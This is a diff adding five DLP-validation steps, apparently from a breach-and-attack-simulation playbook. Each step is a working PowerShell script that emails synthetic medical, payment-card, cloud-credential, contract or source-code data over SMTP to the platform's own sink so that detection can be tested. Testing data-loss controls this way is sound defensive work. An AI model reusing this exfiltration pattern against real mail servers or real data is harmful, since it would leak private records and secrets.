@@ -85,3 +85,213 @@ steps:
       # internal/reporting's sink-primary dlpVerifier, never from this
       # script's own success/failure.
     cleanup: ""
+
+  - name: "DLP Validation — SMTP Exfiltration of Medical Record (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Sends a synthetic medical-record-shaped email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
+      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
+    detection:
+      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[BAS-SIM-DLP] Patient,MRN,Diagnosis`nBAS-SIM-Patient,MRN-000000,Synthetic-Test-Diagnosis"
+      $token = "{{SINK_TOKEN}}"
+      $body = "$token`n$payload"
+      try {
+        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
+          -Subject $token -Body $body `
+          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
+          -ErrorAction Stop
+        Write-Output "DLP_OBSERVATION: send_mail_result=success"
+        Write-Output "EXEC T1048.003: Medical-record-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SMTP sink
+      # actually received a message with a matching Subject, resolved
+      # server-side by internal/smtpsink + internal/verifysync +
+      # internal/reporting's sink-primary dlpVerifier, never from this
+      # script's own success/failure.
+    cleanup: ""
+
+  - name: "DLP Validation — SMTP Exfiltration of Discover Card Record (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Sends a synthetic Discover-card-shaped email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
+      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
+    detection:
+      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nDiscover,6011111111111117"
+      $token = "{{SINK_TOKEN}}"
+      $body = "$token`n$payload"
+      try {
+        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
+          -Subject $token -Body $body `
+          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
+          -ErrorAction Stop
+        Write-Output "DLP_OBSERVATION: send_mail_result=success"
+        Write-Output "EXEC T1048.003: Discover-card-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SMTP sink
+      # actually received a message with a matching Subject, resolved
+      # server-side by internal/smtpsink + internal/verifysync +
+      # internal/reporting's sink-primary dlpVerifier, never from this
+      # script's own success/failure.
+    cleanup: ""
+
+  - name: "DLP Validation — SMTP Exfiltration of GCP Cloud Credentials (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Sends a synthetic GCP-service-account-shaped email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
+      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
+    detection:
+      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "{`"type`":`"service_account`",`"project_id`":`"bas-sim-dlp-project`",`"private_key_id`":`"0000000000000000000000000000000000dead`",`"client_email`":`"bas-sim@bas-sim-dlp-project.iam.gserviceaccount.com`"}"
+      $token = "{{SINK_TOKEN}}"
+      $body = "$token`n$payload"
+      try {
+        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
+          -Subject $token -Body $body `
+          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
+          -ErrorAction Stop
+        Write-Output "DLP_OBSERVATION: send_mail_result=success"
+        Write-Output "EXEC T1048.003: GCP-credential-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SMTP sink
+      # actually received a message with a matching Subject, resolved
+      # server-side by internal/smtpsink + internal/verifysync +
+      # internal/reporting's sink-primary dlpVerifier, never from this
+      # script's own success/failure.
+    cleanup: ""
+
+  - name: "DLP Validation — SMTP Exfiltration of Employment Contract (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Sends a synthetic employment-contract-shaped email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
+      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
+    detection:
+      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[BAS-SIM-DLP] Employment Contract (Synthetic)`nEmployee: BAS-SIM-Employee`nSalary: `$0.00 (synthetic, test fixture only)"
+      $token = "{{SINK_TOKEN}}"
+      $body = "$token`n$payload"
+      try {
+        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
+          -Subject $token -Body $body `
+          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
+          -ErrorAction Stop
+        Write-Output "DLP_OBSERVATION: send_mail_result=success"
+        Write-Output "EXEC T1048.003: Employment-contract-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SMTP sink
+      # actually received a message with a matching Subject, resolved
+      # server-side by internal/smtpsink + internal/verifysync +
+      # internal/reporting's sink-primary dlpVerifier, never from this
+      # script's own success/failure.
+    cleanup: ""
+
+  - name: "DLP Validation — SMTP Exfiltration of Go Source Code (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Sends a synthetic Go-source-code-shaped email (embedded fake secret) via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
+      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
+    detection:
+      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "// [BAS-SIM-DLP]`nconst dbPassword = `"BAS-SIM-DLP-Placeholder8`" // test fixture"
+      $token = "{{SINK_TOKEN}}"
+      $body = "$token`n$payload"
+      try {
+        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
+          -Subject $token -Body $body `
+          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
+          -ErrorAction Stop
+        Write-Output "DLP_OBSERVATION: send_mail_result=success"
+        Write-Output "EXEC T1048.003: Go-source-code-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SMTP sink
+      # actually received a message with a matching Subject, resolved
+      # server-side by internal/smtpsink + internal/verifysync +
+      # internal/reporting's sink-primary dlpVerifier, never from this
+      # script's own success/failure.
+    cleanup: ""
